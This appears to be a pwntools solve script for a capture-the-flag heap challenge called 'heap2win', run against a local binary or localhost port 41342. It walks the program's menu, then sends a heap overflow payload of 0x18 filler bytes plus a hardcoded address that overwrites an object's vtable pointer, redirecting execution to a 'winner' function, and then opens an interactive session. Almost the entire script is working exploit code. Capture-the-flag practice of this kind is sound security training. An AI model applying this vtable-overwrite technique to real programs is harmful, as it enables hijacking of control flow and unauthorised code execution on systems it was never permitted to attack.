from pwn import *


# initialize the binary and set the context (architecture, etc.)
binary = "./src/heap2win" # ensure it is executable (chmod +x)
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("localhost", 41342)

# run with python3 solve.py GDB
elif args.GDB:
    # having issues with gdb showing up? install and run `tmux` before running this script, then uncomment this:
    context.terminal = ["tmux", "splitw", "-h"]

    p = gdb.debug(binary, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process()


### START HERE ###
winnerVtable = p64(0x00403640)

p.recvuntil(b'>> ')
p.sendline(b'1')
p.sendline(b'1')
p.recvuntil(b'>> ')
p.sendline(b'1')
p.sendline(b'1')

p.recvuntil(b'>> ')
p.sendline(b'1')
p.sendline(b'2')
p.recvuntil(b'button!\n')
p.sendline(b'A'*0x18 + winnerVtable)

p.recvuntil(b'>> ')
p.sendline(b'2')
p.sendline(b'2')

p.interactive()
